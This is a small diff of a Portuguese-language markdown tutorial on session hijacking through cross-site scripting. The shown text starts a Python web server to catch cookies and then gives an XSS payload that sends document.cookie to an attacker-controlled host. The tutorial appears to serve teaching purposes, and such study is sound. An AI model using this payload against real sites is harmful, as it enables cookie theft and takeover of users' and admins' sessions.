@@ -67,8 +67,9 @@ agora vamos fazer um roubo de sessão
 iremos usar a mesma sessão de um client, agora imagina em um cenário onde a sessão é de um admin, teríamos acesso a uma área restrita
 
 primeiro iremos criar um server pra receber o cookie de sessão
+
 ```sudo python3 -m http.server 80```
-![image](images/xss-6.png)
+
 
 agora rodamos o código no input e submetemos
 ```<script>new Image().src='http://SEU-IP/?='+document.cookie</script>```
